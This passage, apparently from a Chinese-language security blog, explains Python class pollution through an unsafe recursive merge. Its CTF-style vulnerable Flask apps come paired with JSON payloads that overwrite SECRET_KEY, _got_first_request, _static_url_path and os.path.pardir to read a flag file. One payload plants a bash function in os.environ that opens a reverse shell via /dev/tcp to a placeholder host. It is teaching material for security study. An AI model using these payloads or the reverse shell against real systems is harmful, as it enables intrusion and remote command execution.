class="line">os.environ[&#x27;环境变量名称&#x27;]=&#x27;环境变量值&#x27; #其中key和value均为string类型</span><br><span class="line">os.putenv(&#x27;环境变量名称&#x27;, &#x27;环境变量值&#x27;)</span><br><span class="line">os.environ.setdefault(&#x27;环境变量名称&#x27;, &#x27;环境变量值&#x27;)</span><br></pre></td></tr></table></figure><h5 id="更新系统环境变量"><a href="#更新系统环境变量" class="headerlink" title="更新系统环境变量"></a>更新系统环境变量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.environ[&#x27;环境变量名称&#x27;]=&#x27;新环境变量值&#x27;</span><br></pre></td></tr></table></figure><h5 id="获取系统环境变量"><a href="#获取系统环境变量" class="headerlink" title="获取系统环境变量"></a>获取系统环境变量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.environ[&#x27;环境变量名称&#x27;]</span><br><span class="line">os.getenv(&#x27;环境变量名称&#x27;)</span><br><span class="line">os.environ.get(&#x27;环境变量名称&#x27;, &#x27;默认值&#x27;)# 默认值可给可不给，环境变量不存在返回默认值</span><br></pre></td></tr></table></figure><h5 id="删除系统环境变量"><a href="#删除系统环境变量" class="headerlink" title="删除系统环境变量"></a>删除系统环境变量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">del os.environ[&#x27;环境变量名称&#x27;]</span><br><span class="line">del(os.environ[&#x27;环境变量名称&#x27;])</span><br></pre></td></tr></table></figure><h5 id="判断系统环境变量是否存在"><a href="#判断系统环境变量是否存在" class="headerlink" title="判断系统环境变量是否存在"></a>判断系统环境变量是否存在</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;环境变量值&#x27; in os.environ # 存在返回 True，不存在返回 False</span><br></pre></td></tr></table></figure><p>example</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(dst)</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = a()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;os&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;environ&quot;</span>:&#123;</span><br><span class="line">                        <span class="string">&quot;BASH_FUNC_echo%%&quot;</span>:<span class="string">&quot;() &#123; /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;; &#125;&quot;</span> </span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">merge(payload,instance)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;/bin/bash -c &#x27;echo \&quot;123\&quot;&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="flask相关特定属性"><a href="#flask相关特定属性" class="headerlink" title="flask相关特定属性"></a><code>flask</code>相关特定属性</h4><h5 id="SECRET-KEY"><a href="#SECRET-KEY" class="headerlink" title="SECRET_KEY"></a>SECRET_KEY</h5><p><code>flask</code>的<code>session</code>重要参数，知道该参数可以实现<code>session</code>任意形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;[+]Config:%s&quot;</span>%(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/46b5b189-0a7c-4dcd-8809-935cf1946369.png" alt="图像-20230123143118284"></p><p>Payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;config&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;SECRET_KEY&quot;</span> <span class="punctuation">:</span><span class="string">&quot;Polluted~&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/95bd79dd-ee05-46e5-921a-37253d3f98ad.png" alt="图像-20230123143147406"></p><h5 id="got-first-request"><a href="#got-first-request" class="headerlink" title="_got_first_request"></a><code>_got_first_request</code></h5><p>用于请求网站是否某次请求为<code>Flask</code>启动后请求，是<code>Flask.got_first_request</code>函数的返回值，此外还可能带来不良影响<code>app.before_first_request</code>，依据来源可以知道<code>_got_first_request</code>值为假时调用</p><p>example</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;Is flag here?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(app, <span class="string">&quot;special&quot;</span>) <span class="keyword">and</span> app.special == <span class="string">&quot;U_Polluted_It&quot;</span>:</span><br><span class="line">        flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="built_in">setattr</span>(app, <span class="string">&quot;special&quot;</span>, <span class="string">&quot;U_Polluted_It&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag flag&#123;U_Find_Me&#125;</span></span><br></pre></td></tr></table></figure><p><code>before_first_request</code>成员的<code>init</code>函数只会在第一次调用前被调用，而其中读取<code>flag</code>的逻辑又需要<code>/</code>之后才能调用，这就造成了矛盾，所以需要使用<code>payload</code>在调用<code>/</code>后<code>_got_first_request</code>属性假，这样<code>before_first_request</code>再次调用</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/ede2ca7d-88e8-47c3-84d8-2f2821569bfe.png" alt="图片-20230125235435106"></p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;app&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;_got_first_request&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h5 id="static-url-path"><a href="#static-url-path" class="headerlink" title="_static_url_path"></a><code>_static_url_path</code></h5><p>这个属性中存放的是<code>flask</code>中静态目录的值，默认该值为<code>static</code></p><p>访问<code>flask</code>下的资源可以采用如<code>http://domain/static/xxx</code>，这样实际上就相当于访问<code>_static_url_path</code>目录下<code>xxx</code>的文件并将该文件内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#static/index.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but heres only static/index.html&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#flag</span><br><span class="line"></span><br><span class="line">flag&#123;U_Find_Me&#125;</span><br></pre></td></tr></table></figure><p>污染该属性为当前目录，就能访问当前目录下的<code>flag</code>文件了</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/b3decb77-3a16-4b68-904d-a801722885f7.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/9082208a-9c9f-4e06-a8ab-3214fe1d1c9a.png" alt="img"></p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;app&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;_static_url_path&quot;</span><span class="punctuation">:</span><span class="string">&quot;./&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h5 id="os-path-pardir"><a href="#os-path-pardir" class="headerlink" title="os.path.pardir"></a><code>os.path.pardir</code></h5><p>这个<code>os</code>模块下的变量函数<code>flask</code>模板渲染函数<code>render_template</code>的解析，所以也收录在<code>flask</code>部分</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#templates/index.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but u just can use /file to vist ./templates/file&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#flag</span><br><span class="line"></span><br><span class="line">flag&#123;U_Find_Me&#125;</span><br></pre></td></tr></table></figure><p>访问<code>http://domain/xxx</code>时使用<code>render_tempaltes</code>渲染<code>templates/xxx</code>文件</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240523155836979.png" alt="image-20240523155836979"></p><p><code>os.path.pardir</code>值默认即为<code>..</code>，修改该属性为任意值即可避免报错，实现<code>render_template</code>函数的目录穿越</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/ca338bfb-6da6-4959-a7d4-f45730e8a2bf.png" alt="图像-20230124165503524"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/c19d0b30-6ab2-4142-90b0-7c27a405ea0d.png" alt="图片-20230124165529630"></p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;os&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;pardir&quot;</span><span class="punctuation">:</span><span class="string">&quot;!&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h5 id="Jinja全局数据"><a href="#Jinja全局数据" class="headerlink" title="Jinja全局数据"></a><code>Jinja</code>全局数据</h5><p>除了包括函数、变量、过滤器这三者均被自定义的添加到<code>Jinja</code>语法解析时的环境，操作方式与<code>Jinja</code>语法标识符中完全类似</p><p>这里以增加变量为例子给出模拟的环境如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#templates/index.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;flag if permission else &quot;No 